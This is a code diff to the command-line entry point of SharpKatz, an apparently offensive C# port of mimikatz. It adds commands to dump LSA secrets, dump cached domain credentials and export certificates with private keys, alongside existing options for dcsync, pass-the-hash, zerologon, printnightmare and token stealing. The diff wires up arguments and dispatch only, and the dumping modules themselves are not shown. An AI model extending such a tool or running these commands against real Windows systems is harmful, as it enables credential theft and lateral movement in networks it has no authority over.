@@ -53,6 +53,9 @@ namespace SharpKatz
             string library = null;
             string system = null;
             string sam = null;
+            string security = null;
+            string certExportStr = null;
+            string certDir = null;
             string pid = null;
             string password = null;
             string parentpid = null;
@@ -91,6 +94,9 @@ namespace SharpKatz
 
                 { "System=", "--System [systempath]", v => system = v },
                 { "Sam=", "--Sam [sampath]", v => sam = v },
+                { "Security=", "--Security [securitypath]", v => security = v },
+                { "CertExport=", "--CertExport [true/false]", v => certExportStr = v },
+                { "CertDir=", "--CertDir [outputdir]", v => certDir = v },
 
                 { "Pid=", "--Pid [pid]", v => pid = v },
                 { "Password=", "--Password [password]", v => password = v },
@@ -168,6 +174,10 @@ namespace SharpKatz
                 Console.WriteLine("  Example: --Command printnightmare --Target dc --Library \\\\host\\share\\lib.dll --AuthUser user --AuthPassword password --AuthDomain dom");
                 Console.WriteLine("  Example: --Command hivenightmare");
                 Console.WriteLine("  Example: --Command dumpsam --System <system_path> --Sam <sam_path>");
+                Console.WriteLine("  Example: --Command lsasecrets --System <system_path> --Security <security_path>");
+                Console.WriteLine("  Example: --Command lsacache --System <system_path> --Security <security_path>");
+                Console.WriteLine("  Example: --Command certexport");
+                Console.WriteLine("  Example: --Command certexport --CertExport true --CertDir C:\\certs");
                 Console.WriteLine("  Example: --Command listshadows");
                 Console.WriteLine("  Example: --Command token --Mode list");
                 Console.WriteLine("  Example: --Command token --Mode steal --Pid 1234");
@@ -188,6 +198,7 @@ namespace SharpKatz
                 !command.Equals("tspkg") && !command.Equals("wdigest") && !command.Equals("ekeys") && !command.Equals("dcsync") &&
                 !command.Equals("pth") && !command.Equals("zerologon") && !command.Equals("printnightmare") && !command.Equals("hivenightmare") &&
                 !command.Equals("listshadows") && !command.Equals("dumpsam") &&
+                !command.Equals("lsasecrets") && !command.Equals("lsacache") && !command.Equals("certexport") &&
                 !command.Equals("token") && !command.Equals("vault") && !command.Equals("spawn"))
             {
                 Console.WriteLine("Unknown command");
@@ -293,7 +304,7 @@ namespace SharpKatz
 
             // --- Commands that need LSASS or elevated context ---
 
-            if (!command.Equals("dcsync") && !command.Equals("zerologon") && !command.Equals("printnightmare") && !command.Equals("hivenightmare") && !command.Equals("listshadows") && !command.Equals("dumpsam"))
+            if (!command.Equals("dcsync") && !command.Equals("zerologon") && !command.Equals("printnightmare") && !command.Equals("hivenightmare") && !command.Equals("listshadows") && !command.Equals("dumpsam") && !command.Equals("lsasecrets") && !command.Equals("lsacache") && !command.Equals("certexport"))
             {
 
                 if (!Utility.IsElevated())
@@ -589,7 +600,47 @@ namespace SharpKatz
                                     }
 
                                     Module.Sam.LsadumpSam(system, sam);
-                                    
+
+                                }
+                                else if (command.Equals("lsasecrets"))
+                                {
+                                    if (string.IsNullOrEmpty(system))
+                                    {
+                                        Console.WriteLine("   Missing or incorrect required parameter -> System");
+                                        return;
+                                    }
+                                    if (string.IsNullOrEmpty(security))
+                                    {
+                                        Console.WriteLine("   Missing or incorrect required parameter -> Security");
+                                        return;
+                                    }
+
+                                    Module.LsaSecrets.LsadumpSecrets(system, security);
+                                }
+                                else if (command.Equals("lsacache"))
+                                {
+                                    if (string.IsNullOrEmpty(system))
+                                    {
+                                        Console.WriteLine("   Missing or incorrect required parameter -> System");
+                                        return;
+                                    }
+                                    if (string.IsNullOrEmpty(security))
+                                    {
+                                        Console.WriteLine("   Missing or incorrect required parameter -> Security");
+                                        return;
+                                    }
+
+                                    Module.LsaCache.LsadumpCache(system, security);
+                                }
+                                else if (command.Equals("certexport"))
+                                {
+                                    bool exportPfx = false;
+                                    if (!string.IsNullOrEmpty(certExportStr))
+                                    {
+                                        try { exportPfx = bool.Parse(certExportStr); } catch { }
+                                    }
+
+                                    Module.CertificateExport.ExportCertificates(exportPfx, certDir);
                                 }
                                 else
                                 {
